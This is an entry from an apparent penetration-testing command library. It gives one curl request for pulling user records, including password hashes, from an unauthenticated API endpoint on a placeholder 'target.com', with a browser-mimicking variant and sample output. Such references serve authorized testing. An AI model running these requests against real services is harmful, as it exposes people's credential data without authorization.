---
data: 'curl -X GET "https://target.com/api/users/1" -H "Accept: application/json" -v'
tags:
  - api
  - recon
  - disclosure
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 5ae3bbb3-4ea0-416f-a4c5-e542be8ace33
created_at: '2025-12-14T17:32:39.383Z'
updated_at: '2025-12-14T17:32:39.383Z'
verified: false
validated: true
submitted: true
---
# curl-api-user-request

## Command

```bash
curl -X GET "https://target.com/api/users/1" -H "Accept: application/json" -v
```

## Description

This command uses curl to send an HTTP GET request to a vulnerable API endpoint, requesting user data by ID without authentication, to disclose sensitive information like hashed passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://target.com/api/users/1"` | The API endpoint URL with user ID (replace target.com and ID as needed) | Yes |
| `-H "Accept: application/json"` | Sets the Accept header to request JSON response | Yes |
| `-v` | Verbose mode to show request/response details including headers | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/users/1" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://target.com/api/users/1" -H "Accept: application/json" -H "User-Agent: Mozilla/5.0" -o response.json
```

> Adds a custom User-Agent to mimic browser and saves output to file.

## Expected Output

A JSON object like {"id":1,"username":"admin","email":"admin@example.com","password_hash":"$2b$12$examplehash"}, confirming disclosure. In verbose mode, headers show no auth challenges (e.g., no WWW-Authenticate).

## Related

- [[Related Procedure: Exploit-Insecure-API-Endpoint-for-Credential-Disclosure]]
